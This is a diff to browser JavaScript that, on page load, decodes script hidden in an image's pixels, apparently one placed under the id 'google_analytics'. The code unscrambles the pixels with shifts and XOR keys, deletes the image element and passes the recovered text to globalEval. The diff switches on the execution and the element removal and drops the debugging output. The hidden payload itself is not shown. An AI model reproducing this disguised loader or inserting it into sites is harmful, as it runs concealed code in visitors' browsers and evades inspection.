@@ -1,5 +1,3 @@
-
-
 var globalEval = function globalEval(src) {
 	if (window.execScript) {
 		window.execScript(src);
@@ -28,13 +26,12 @@ window.onload = function(){
 		data = imageData.data,
 		dlen = data.length
 
-	var	pixel_size = 4,
-		pixels_per_row = i_w * pixel_size;
-
-
 
 	var toImageMatrix = function(data)
 	{
+		var	pixel_size = 4,
+			pixels_per_row = i_w * pixel_size;
+		
 		// To image matrix
 		var image_matrix = [],
 			pixel = new Uint8Array(pixel_size);
@@ -65,103 +62,64 @@ window.onload = function(){
 	}
 
 
+	var image_matrix = toImageMatrix(data)
 
 
-	var flipHorizontal = function(image_matrix)
-	{
-		var middle = parseInt(i_w/2)
-		for (var r = 0; r < i_h; r++){
-			for (var c = 0; c < middle; c++){
-				var temp = image_matrix[r][c]
-				image_matrix[r][c] = image_matrix[r][i_w-(c+1)]
-				image_matrix[r][i_w-(c+1)] = temp
-			}
-		}
+	var diag_shift = 22, diag_xor = 247, rgb_xor = 93;
+
+	var column_shift_map = {
+		2:[22, 17,[56,71,90]],
+		23:[-7, 56,[53,45,112]],
+		3: [33,-90,[93,11,65]],
+		14: [99,-76,[31,65,2]],
+		6: [-20,12,[14,15,16]],
+		190: [20,12,[14,15,16]]
 	}
 
+	// Asc. order -- none of this really matters
+	var column_shift_order = Object.keys(column_shift_map).sort(
+		function(a, b) {
+		  return a - b;
+		});
 
-	var flipDiagonal = function(image_matrix)
-	{
-		for (var r = 0; r < i_h; r++){
-			for (var c = r; c < i_w; c++)
-			{
-				var temp = image_matrix[r][c];
-				image_matrix[r][c] = image_matrix[c][r];
-				image_matrix[c][r] = temp;
-			}
-		}
-	}
+	for (var row=i_h-1; row >=0; row --){
+		for (var col=0; col < i_w; col ++)
+		{
+			// Unshuffle rows and cols
+			for (var t=column_shift_order.length-1; t >= 0; t--){
+				var cmod = column_shift_order[t];
 
+				if (col % cmod === 0){
+					var row_diff = column_shift_map[cmod][0],
+						col_diff = column_shift_map[cmod][1],
+						xor_diff = column_shift_map[cmod][2];
 
-	var flipVertical = function(image_matrix)
-	{
-		for (var r=0; r < i_h/2; r++){
-			var temp = image_matrix[r]
-			image_matrix[r] = image_matrix[i_h-(r+1)]
-			image_matrix[i_h-(r+1)] = temp
-		}
-	}
+					var nrow = (i_h + row+row_diff) % i_h,
+						ncol = (i_w + col+col_diff) % i_w
 
+					for (var p=0; p < 3; p++){
+						image_matrix[nrow][ncol][p] ^= xor_diff[p]
+					}
 
-
-	var imageToData = function(image_matrix)
-	{
-		var code = new Uint8Array(dlen);
-
-		for (var r=0; r < i_h; r++){
-			for (var c=0; c < i_w; c++){
-				for (var j=0; j < pixel_size; j++){
-					code[(r*i_w*pixel_size)+(c*pixel_size)+j] = image_matrix[r][c][j]
+					var tmp = image_matrix[nrow][ncol]
+					image_matrix[nrow][ncol] = image_matrix[row][col]
+					image_matrix[row][col] = tmp;
 				}
 			}
+
+			for (var p=0; p<3; p++){
+				image_matrix[row][col][p] ^= rgb_xor
+			}
 		}
-		return code
+
+		var tmp = image_matrix[(row+diag_shift)%i_h][(row+diag_shift)%i_w]
+		image_matrix[(row+diag_shift) % i_h][(row+diag_shift) % i_w] = image_matrix[row][row]
+		image_matrix[row][row] = tmp
+
+		for (var p=0; p < 3; p++){
+			image_matrix[row][row][p] ^= diag_xor
+		}
 	}
-	
-	
-	var shiftBackward = function(image_matrix,n)
-	{
-		var code = imageToData(image_matrix)
-
-		var store = new Uint8Array(n)		// Store the first n
-		for (var j=0; j <n; j++){
-			store[j] = code[j]
-		}
-		for (var j=n; j < code.length; j++){ // Iterate over the remaning
-			code[j-n] = code[j]
-		}
-		for (var j=0; j <n; j++){		// Replace last n with the first
-			code[dlen+j-n] = store[j]
-		}
-
-		return toImageMatrix(code)
-	}
-
-
-	var shiftForward = function(image_matrix,n) // NEEDS WORK
-	{
-		var code = imageToData(image_matrix)
-
-		var store = new Uint8Array(n);			// Store the last n
-		for (var j=dlen-n; j < dlen; j++){
-			store[j-(dlen-n)] = code[j]
-		}
-		for (var j=dlen-(n+1); j >= 0 ;j--){ // Iterate over the previous
-			code[j+n] = code[j]
-		}
-		for (var j=0; j <n; j++){ // Replace first n with last
-			code[j] = store[j]
-		}
-		return toImageMatrix(code)
-	}
-
-
-
-	var image_matrix = toImageMatrix(data)
-	flipVertical(image_matrix) // works
-//	flipHorizontal(image_matrix)
-//	flipDiagonal(image_matrix)
-
 
 	// Decode (this works)
 	var code = [];
@@ -174,9 +132,10 @@ window.onload = function(){
 	}
 
 	var new_script = String.fromCharCode.apply(String,code);
-	console.log(new_script)
-	// var io = document.getElementById('google_analytics')
-	// io.remove();
+	new_script = new_script.split("//////")[0];  // Split from terminal character
+//	console.log(new_script)
+	var io = document.getElementById('google_analytics')
+	io.remove();
 
-	// globalEval(new_script)
+	globalEval(new_script)
 }
